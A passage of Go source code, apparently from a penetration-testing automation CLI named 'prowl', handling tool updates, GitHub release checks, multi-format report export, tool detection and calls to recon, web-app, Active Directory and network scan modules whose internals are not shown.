	fmt.Fprintln(os.Stderr, "\033[36mupdating package lists...\033[0m")

	cmd := exec.Command("sudo", "apt-get", "update", "-qq")
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	if err := cmd.Run(); err != nil {
		fmt.Fprintf(os.Stderr, "\033[31mfailed to update package lists: %v\033[0m\n", err)
		os.Exit(1)
	}

	fmt.Fprintln(os.Stderr, "\033[36mupgrading installed tools...\033[0m")

	cmd = exec.Command("sudo", "apt-get", "upgrade", "-y")
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	if err := cmd.Run(); err != nil {
		fmt.Fprintf(os.Stderr, "\033[31mfailed to upgrade tools: %v\033[0m\n", err)
		os.Exit(1)
	}

	fmt.Fprintln(os.Stderr, "\033[32mtools updated successfully\033[0m")
}

func handleCheckUpdates() {
	fmt.Fprintf(os.Stderr, "\033[36mchecking for prowl updates...\033[0m\n")

	fmt.Fprintf(os.Stderr, "current version: %s (commit: %s)\n", version, commit)
	fmt.Fprintf(os.Stderr, "build date: %s\n", date)

	fmt.Fprintln(os.Stderr, "\033[90mchecking GitHub releases...\033[0m")

	cmd := exec.Command("curl", "-sS", "https://api.github.com/repos/foxinwinter/prowl/releases/latest")
	output, err := cmd.CombinedOutput()
	if err != nil {
		fmt.Fprintf(os.Stderr, "\033[31mfailed to check updates: %v\033[0m\n", err)
		fmt.Fprintln(os.Stderr, "\033[90mthis may be a dev build without update support\033[0m")
		return
	}

	var release struct {
		TagName string `json:"tag_name"`
		Name    string `json:"name"`
	}
	if err := json.Unmarshal(output, &release); err != nil {
		fmt.Fprintf(os.Stderr, "\033[31mparse error: %v\033[0m\n", err)
		return
	}

	if release.TagName == "" {
		fmt.Fprintln(os.Stderr, "\033[33mno releases found\033[0m")
		return
	}

	if release.TagName == "v"+version || release.TagName == version {
		fmt.Fprintln(os.Stderr, "\033[32m✓ you are up to date!\033[0m")
	} else {
		fmt.Fprintf(os.Stderr, "\033[33mnew version available: %s (current: %s)\033[0m\n", release.TagName, version)
		fmt.Fprintln(os.Stderr, "run 'prowl --self-update' to update")
	}
}

func handleSelfUpdate() {
	fmt.Fprintf(os.Stderr, "\033[36mself-updating prowl...\033[0m\n")

	cmd := exec.Command("curl", "-sS", "https://api.github.com/repos/foxinwinter/prowl/releases/latest")
	output, err := cmd.CombinedOutput()
	if err != nil {
		fmt.Fprintf(os.Stderr, "\033[31mfailed to check for updates: %v\033[0m\n", err)
		os.Exit(1)
	}

	var release struct {
		TagName string `json:"tag_name"`
		Assets  []struct {
			Name               string `json:"name"`
			BrowserDownloadURL string `json:"browser_download_url"`
		} `json:"assets"`
	}
	if err := json.Unmarshal(output, &release); err != nil {
		fmt.Fprintf(os.Stderr, "\033[31mfailed to parse release info: %v\033[0m\n", err)
		os.Exit(1)
	}

	if release.TagName == "v"+version || release.TagName == version {
		fmt.Fprintln(os.Stderr, "\033[32m✓ you are already on the latest version!\033[0m")
		return
	}

	fmt.Fprintf(os.Stderr, "found update: %s (current: %s)\n", release.TagName, version)

	exe, err := os.Executable()
	if err != nil {
		fmt.Fprintf(os.Stderr, "\033[31mcannot determine executable path: %v\033[0m\n", err)
		os.Exit(1)
	}

	// For now, just tell the user to update manually since we don't know the platform
	fmt.Fprintln(os.Stderr, "\033[90mmanual update instructions:\033[0m")
	fmt.Fprintf(os.Stderr, "  go install github.com/foxinwinter/prowl/cmd/prowl@%s\n", release.TagName)
	fmt.Fprintf(os.Stderr, "  or download from: https://github.com/foxinwinter/prowl/releases\n")

	_ = exe
}

// ===== REPORT GENERATION =====

func handleGenerateReport(findingsFile, format string) {
	if findingsFile == "" {
		fmt.Fprintln(os.Stderr, "error: findings file path is required")
		fmt.Fprintln(os.Stderr, "usage: prowl --generate-report findings.json --format html")
		os.Exit(1)
	}

	data, err := os.ReadFile(findingsFile)
	if err != nil {
		fmt.Fprintf(os.Stderr, "error reading findings file: %v\n", err)
		os.Exit(1)
	}

	var findings []export.ExportFinding
	if err := json.Unmarshal(data, &findings); err != nil {
		fmt.Fprintf(os.Stderr, "error parsing findings: %v\033[0m\n", err)
		os.Exit(1)
	}

	if len(findings) == 0 {
		fmt.Fprintln(os.Stderr, "no findings to report")
		os.Exit(0)
	}

	var output []byte
	switch format {
	case "html", "report":
		output, err = export.ToHTMLReport(findings, export.HTMLReportMetadata{
			Title:  "Security Assessment Report",
			Date:   time.Now(),
			Target: "Various",
		})
	case "sarif":
		output, err = export.ToSARIF(findings)
	case "csv":
		output, err = export.ToCSV(findings)
	case "burp", "xml":
		output, err = export.ToBurpXML(findings)
	case "nessus":
		output, err = export.ToNessus(findings)
	case "jira":
		output, err = export.ToJira(findings)
	case "json":
		output, err = json.MarshalIndent(findings, "", "  ")
	default:
		fmt.Fprintf(os.Stderr, "unknown format: %s\n", format)
		fmt.Fprintln(os.Stderr, "available formats: html, sarif, csv, burp, nessus, jira, json")
		os.Exit(1)
	}

	if err != nil {
		fmt.Fprintf(os.Stderr, "error generating report: %v\n", err)
		os.Exit(1)
	}

	baseName := strings.TrimSuffix(findingsFile, filepath.Ext(findingsFile))
	ext := "." + strings.TrimPrefix(format, ".")
	if format == "html" || format == "report" {
		ext = ".html"
	} else if format == "sarif" {
		ext = ".sarif"
	} else if format == "burp" || format == "xml" {
		ext = ".xml"
	} else if format == "nessus" {
		ext = ".nessus"
	}

	outPath := baseName + "-report" + ext
	if err := os.WriteFile(outPath, output, 0644); err != nil {
		fmt.Fprintf(os.Stderr, "error writing report: %v\n", err)
		os.Exit(1)
	}

	fmt.Fprintf(os.Stderr, "\033[32mreport generated: %s (%d findings)\033[0m\n", outPath, len(findings))
}

// ===== TOOL CHECKER WITH VERSION =====

func checkToolsWithVersion() {
	fmt.Println("\033[36mchecking available tools...\033[0m")

	results := tools.DetectAll()
	available := 0
	missing := 0

	for _, r := range results {
		if r.Found {
			ver := r.Version
			if ver == "" {
				ver = "installed"
			}
			if len(ver) > 50 {
				ver = ver[:47] + "..."
			}
			fmt.Printf("  \033[32m+\033[0m %-20s \033[90m%s\033[0m\n", r.Tool.Name, ver)
			available++
		} else {
			fmt.Printf("  \033[31m-\033[0m %-20s \033[90m%s\033[0m\n", r.Tool.Name, r.Tool.Description)
			missing++
		}
	}

	if missing > 0 {
		fmt.Printf("\n\033[33m%d tools available, %d missing. Install missing tools for full functionality.\033[0m\n\n", available, missing)
	} else {
		fmt.Printf("\n\033[32mall %d tools available.\033[0m\n\n", available)
	}
}

// ===== AUTO MODULE RUNNERS =====

func runAutoRecon(ctx context.Context, pipeline *auto.Pipeline, target string) {
	fmt.Printf("\n\033[1m=== Running AutoRecon Enhanced ===\033[0m\n")
	recon := auto.NewAutoReconEnhanced(pipeline, target)
	result, findings, err := recon.Run(ctx)
	if err != nil {
		fmt.Fprintf(os.Stderr, "recon error: %v\n", err)
	}
	fmt.Printf("\n\033[32mRecon complete: %d subdomains, %d live hosts, %d findings\033[0m\n",
		len(result.Subdomains), len(result.LiveHosts), len(findings))
}

func runAutoWebApp(ctx context.Context, pipeline *auto.Pipeline, target string) {
	fmt.Printf("\n\033[1m=== Running AutoWebApp ===\033[0m\n")
	webapp := auto.NewAutoWebApp(pipeline, target)
	result, findings, err := webapp.Run(ctx)
	if err != nil {
		fmt.Fprintf(os.Stderr, "webapp error: %v\n", err)
	}
	fmt.Printf("\n\033[32mWebApp complete: %d technologies, %d parameters, %d findings\033[0m\n",
		len(result.Technologies), len(result.Parameters), len(findings))
}

func runAutoAD(ctx context.Context, pipeline *auto.Pipeline, target string) {
	fmt.Printf("\n\033[1m=== Running AutoAD ===\033[0m\n")
	ad := auto.NewAutoAD(pipeline, target)
	result, findings, err := ad.Run(ctx)
	if err != nil {
		fmt.Fprintf(os.Stderr, "ad error: %v\n", err)
	}
	fmt.Printf("\n\033[32mAD complete: %d users, %d groups, %d findings\033[0m\n",
		len(result.Users), len(result.Groups), len(findings))
}

func runAutoNetwork(ctx context.Context, pipeline *auto.Pipeline, target string) {
	fmt.Printf("\n\033[1m=== Running AutoNetwork ===\033[0m\n")
	net := auto.NewAutoNetwork(pipeline, target)
	result, findings, err := net.Run(ctx)
	if err != nil {
		fmt.Fprintf(os.Stderr, "network error: %v\n", err)
	}
	fmt.Printf("\n\033[32mNetwork complete: %d hosts, %d total ports, %d findings\033[0m\n",
		len(result.Hosts), result.TotalPorts, len(findings))
}

// ===== VALIDATORS =====

func validateScanType(s string) *string {
	valid := map[string]bool{
		"recon": true, "vuln": true, "secrets": true,
		"webapp": true, "ad": true, "network": true, "all": true,
	}
	if !valid[s] {
		fmt.Fprintf(os.Stderr, "invalid scan type %q, defaulting to 'all'\n", s)
		all := "all"
		return &all
	}
	return &s
}

func validateFormat(f string) *string {
	valid := map[string]bool{
		"md": true, "html": true, "json": true, "csv": true,
		"sarif": true, "burp": true, "nessus": true,
	}
	if !valid[f] {
		fmt.Fprintf(os.Stderr, "invalid format %q, defaulting to 'md'\n", f)
		md := "md"
		return &md
	}
	return &f
}
